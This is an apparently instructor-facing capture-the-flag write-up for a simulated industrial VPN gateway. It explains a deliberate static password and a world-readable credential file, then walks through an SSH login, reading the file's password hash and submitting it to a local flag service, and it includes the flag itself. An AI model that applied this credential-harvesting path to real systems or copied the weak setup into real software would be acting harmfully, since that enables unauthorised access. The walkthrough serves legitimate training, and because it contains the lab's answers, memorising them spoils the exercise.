Stage 1 — Red Team Writeup (Instructor-Facing)
Challenge: Remote Access Gateway — Credential Reuse & File Permission Weakness
Overview
The vpn-gateway container simulates an external-facing remote access appliance for Prabal Urja Pvt Ltd. In a production OT/ICS environment, field technicians and third-party vendors connect through such gateways to perform maintenance or monitor station operations.
In this lab, the gateway exposes two core management services:
OpenVPN (1194/UDP) — A TLS-authenticated tunnel allowing players to route into the simulated industrial network zones.
SSH (2222/TCP mapped to 22/TCP) — An administrative command-line interface for remote configuration.
The objective of Stage 1 is to gain a foothold on the remote access gateway, locate a misconfigured credential database file, extract the shadow hash for the low-privilege field_tech account, and use it to compute the stage flag.

Why This Works — Design Rationale & Vulnerability Breakdown
Credential Reuse and Static Passwords (T0859 - Valid Accounts):
The gateway comes pre-configured with a low-privilege field_tech account. Across all instances, this account uses the static cleartext password FieldTech2024!. In real-world industrial environments, field technicians and vendors frequently reuse credentials across multiple sites, document them in shared text files, or rely on vendor-default passwords that are rarely changed.
File Permission Misconfiguration on Sensitive Databases:
The OpenVPN server configuration utilizes a user authentication backend file located at /etc/openvpn/server/field_accounts.conf. Due to a deployment oversight (simulating realistic administrative error), this file is owned by the field_tech user and has read permissions enabled (-rw-r----- / mode 640).
Because the file is readable by the field_tech group/user, any technician who successfully logs into the SSH terminal can read the credential storage file.
Audit Trail Generation (CEF Event Logging):
To support Blue Team monitoring exercises, access to /etc/openvpn/server/field_accounts.conf is monitored in real-time by an inotify watcher loop. Any access (such as running cat) triggers the generation of an audit log in Common Event Format (CEF) appended to /var/log/ctf/range_events.cef.

Intended Solve Path (Step-by-Step)
STEP 1 — SSH into VPN Gateway
Command:

ssh field_tech@127.0.0.1 -p 2222
Password:
FieldTech2024!
Expected login output:

Welcome to Alpine Linux 3.20!
vpn-gateway:~$
STEP 2 — Locate sensitive configuration database
Command:

ls -la /etc/openvpn/server/

Expected output:

-rw-r----- 1 field_tech field_tech 137 field_accounts.conf
STEP 3 — Extract evidence artifact
Command:

cat /etc/openvpn/server/field_accounts.conf

Expected output:


field_tech:$6$MGVkNWJlYWFkM2Fj$oxMvwJ8OpQdGpJ/nRInHklXfchYSeKboxsGKhVOqCtkiXe7CV8iiYOJ8KlwraxsuBIwrEUIGSgEnLE8wsFbxy0:19000:0:99999:7:::
This line (the full entry) is the Stage 1 artifact.
STEP 4 — Retrieve Final Flag
Because the player-facing environment runs on the target, the final computed flag is retrieved by connecting to the local flag oracle service on port 9001 and providing the correct Stage 1 artifact.
Command:

nc 127.0.0.1 9001
When prompted, enter the full credentials line extracted from /etc/openvpn/server/field_accounts.conf in Step 3.
Expected output:

Enter Stage 1 Artifact (content of field_accounts.conf): field_tech:$6$MGVkNWJlYWFkM2Fj$oxMvwJ8OpQdGpJ/nRInHklXfchYSeKboxsGKhVOqCtkiXe7CV8iiYOJ8KlwraxsuBIwrEUIGSgEnLE8wsFbxy0:19000:0:99999:7:::
ACCESS GRANTED. Flag: FLAG{S1-1655b2bfebbf0896}

